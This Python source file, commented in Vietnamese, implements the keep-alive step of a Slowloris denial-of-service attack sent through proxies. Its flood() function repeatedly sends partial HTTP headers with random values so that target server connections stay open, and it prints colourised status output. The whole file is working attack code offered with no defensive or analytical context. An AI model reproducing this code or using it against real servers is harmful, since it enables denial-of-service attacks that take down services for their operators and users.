import random
import socket
from typing import Dict
from colorama import Fore as F

def flood(sock: socket.SocketType, proxy: Dict[str, str]) -> None:
    """Giữ các kết nối sống trong cuộc tấn công Slowloris thông qua proxy.

    Args:
        - sock: Socket cần được giữ kết nối
        - proxy: Proxy sẽ được sử dụng

    Returns:
        None
    """
    try:
        laddr, port = sock.getsockname()
        random_header = random.randint(1, 5000)
        # Gửi tiêu đề với giá trị ngẫu nhiên
        sock.send(f"X-a: {random_header}".encode("utf-8"))

        proxy_addr = (
            f"{F.RESET}|{F.RESET} Proxy: {F.BLUE}{proxy['addr'] + ':' + proxy['port']:>21} "
        )
        header_sent = f"{F.RESET} Header Sent:{F.BLUE} X-a {random_header:>4}"
        print(
            f"{F.RESET} --> Socket: {F.BLUE}{laddr}:{port} {proxy_addr}{F.RESET}|{header_sent} {F.RESET}"
        )
    except (socket.error, OSError) as e:
        # Xử lý lỗi nếu không thể gửi dữ liệu qua socket
        print(f"{F.RED}[!] Error: {e}{F.RESET}")
